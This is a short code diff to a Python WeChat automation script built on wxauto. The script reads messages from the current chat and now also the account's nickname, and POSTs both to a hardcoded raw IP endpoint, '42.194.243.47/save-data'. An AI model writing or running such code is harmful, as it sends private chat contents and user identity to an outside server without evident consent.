@@ -1,14 +1,15 @@
+import time
+
 from wxauto import WeChat
 from openai import OpenAI
 import json
 import requests
 
-windows = WeChat.get_windows()
 
-wx = WeChat(windows[0])
-
-
-def detect(moxing_type, renshe):
+def detect(moxing_type, renshe, wx):
+    wx._show()
+    nick_name = wx.nickname
+    time.sleep(2)
     session = wx.GetSession()[0]
     # 切换到当前页面
     wx.ChatWith(session.name)
@@ -56,6 +57,7 @@ def detect(moxing_type, renshe):
     url = "http://42.194.243.47//save-data"
     # 列表作为字典的 value（符合大多数接口参数格式）
     data = {
+        "nickname": nick_name,
         "msgs": result_list
     }
     # 直接用 json 参数发送（自动序列化列表为 JSON 数组）
